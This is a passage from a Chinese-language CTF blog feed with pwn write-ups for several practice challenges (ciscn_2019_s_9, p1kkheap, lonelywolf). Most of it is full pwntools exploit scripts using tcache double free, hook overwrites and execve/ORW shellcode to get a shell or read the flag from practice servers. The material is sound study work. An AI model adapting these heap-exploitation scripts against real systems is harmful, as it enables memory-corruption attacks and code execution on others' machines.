class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>rcu64 = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size of Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content of heap:&quot;</span>,data)<br>def <span class="hljs-built_in">edit</span>(idx,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>,data)<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x28,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x28)#<span class="hljs-number">0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x28,b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x28)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x28,b<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0</span>x28)#<span class="hljs-number">2</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x8,b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)#<span class="hljs-number">3</span><br>p1=b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x28+b<span class="hljs-string">&#x27;\x71&#x27;</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,p1)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,b<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">8</span>)#<span class="hljs-number">1</span><br>p2=b<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0</span>x48+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x21)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(free_got)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">1</span>,p2)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free_addr=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>base=free_addr-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys=base+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>p3=<span class="hljs-built_in">p64</span>(sys)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>,p3)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h2><p>复习了如何写shellcode，基本没遇到过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./ciscn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,27131)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">jmp_esp</span>=0x8048554<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">shell</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">xor ebx,ebx</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">push edx</span><br><span class="hljs-string">push 0x68732f2f</span><br><span class="hljs-string">push 0x6e69622f </span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">mov al,0xB</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">esp</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">sub esp,40</span><br><span class="hljs-string">call esp</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">shell</span>=asm(shell)<br><span class="hljs-attribute">esp</span>=asm(esp)<br><span class="hljs-attribute">p</span>=shell.ljust(0x24,b&#x27;\x90&#x27;)+p32(jmp_esp)+esp<br>sla(<span class="hljs-string">&quot;&gt;&quot;</span>,p)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="末尾"><a href="#末尾" class="headerlink" title="末尾"></a>末尾</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tcache-attack</title>
    <link href="/2023/07/11/Tcache-attack/"/>
    <url>/2023/07/11/Tcache-attack/</url>
    
    <content type="html"><![CDATA[<h1 id="p1kkheap"><a href="#p1kkheap" class="headerlink" title="p1kkheap"></a>p1kkheap</h1><p>部分功能的使用次数被限制，最多可以申请7个chunk，最多进行3次free。</p><p>由于execve遭到禁用，可以使用ORW来拿到flag</p><p>在0x66660000有个大小为0x1000的属性为RWX的空间，可以写shellcode</p><p>将shellcode的地址写入malloc_hook，然后触发malloc_hook</p><p>对于tcache，double free同一个堆，在tcache bin会构成循环链表，此时count=2，然后再申请 3个一样大小的堆，那么count就变成了-1（无符号与有符号比较时，有符号数会变成无符号数）。再delete一个unsorted bin范围的堆，这个堆就会放入unsorted bin，然后我们用show功能就能泄露出libc中的指针。</p><p>如果我们可以修改tcache bin 的表头，我们可以控制下一次堆分配的位置。</p><p>我们找到tcache_entry表头的位置，计算出距离</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-07-11-145248.1utscseieosg.y4cs6s3omm8.jpg"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-07-11-162951.1dcelts92qe8.jpg"></p><p>在双向链表写入表头地址，我们就可以分配到表头的位置。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>io_ch=<span class="hljs-number">1</span><br>isgdb=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./heap&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28337</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if isgdb==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;/home/kali/pwntool/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">add</span>(size):<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;Your Choice: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;Choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;id:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">edit</span>(idx,content):<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;Choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;id:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;Choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&#x27;id:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>rwx_addr=<span class="hljs-number">0</span>x66660000<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">1</span><br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;content: &quot;</span>)<br>tcache_chunk_0=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_chunk_1))<br>tcache_entry=tcache_chunk_0-<span class="hljs-number">0</span>x198<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">0</span>,<span class="hljs-number">2</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">p64</span>(tcache_entry))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">0</span>,<span class="hljs-number">3</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">4</span>,tcache_entry_chunk<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">4</span>,<span class="hljs-built_in">p64</span>(rwx_addr))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">5</span>,raw_chunk<br>shell=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shell+=shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>x66660100,<span class="hljs-number">64</span>)<br>shell+=shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x66660100,<span class="hljs-number">64</span>)<br>shell=<span class="hljs-built_in">asm</span>(shell)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">5</span>,shell)#write shell<br>#unsortbin attack<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;content: &quot;</span>)<br>libc_addr1=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc_base=libc_addr1-<span class="hljs-number">0</span>x3ebca0<br>malloc_hook_addr=libc_base+<span class="hljs-number">0</span>x3ebc30<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">4</span>,<span class="hljs-built_in">p64</span>(malloc_hook_addr))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100)#<span class="hljs-number">6</span>,malloc_hook_chunk<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">6</span>,<span class="hljs-built_in">p64</span>(rwx_addr))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x1)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h1 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h1><p>目前远程在libc上有些问题，只通了本地的</p><p>我们只能使用一个堆，0</p><p>存在UAF，可以进行double free</p><p>先泄露tcache出的stuuct的地址，然后控制它</p><p>在将0x250大小的位置的值伪造为7，使得tcache塞满，就可以利用unsortbin attack来泄露libc的地址，随后便是修改free_hook或者是malloc_hook为system或者one_gadget</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>io_ch=<span class="hljs-number">0</span><br>de_bug=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;heap&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28061</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;/home/kali/pwntool/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">add</span>(idx,size):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>def <span class="hljs-built_in">edit</span>(idx,content):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>sub1=<span class="hljs-number">0</span>x260<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x38)#<span class="hljs-number">0</span><br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;Content: &quot;</span>)<br>tcache_0=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap_base=tcache_0-sub1<br>heap_head=heap_base+<span class="hljs-number">0</span>x10<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64</span>(heap_head))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x38)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x38)<br>p1=b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">35</span>+b<span class="hljs-string">&#x27;\x07&#x27;</span><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,p1)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br>libc_base=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - (libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] + <span class="hljs-number">0</span>x70)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x78)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64</span>(free_hook))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x78)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x78)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64</span>(sys))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x78)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello,world.</title>
    <link href="/2023/07/02/hello-world/"/>
    <url>/2023/07/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>HELLO , WORLD !</p>]]></content>
    
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
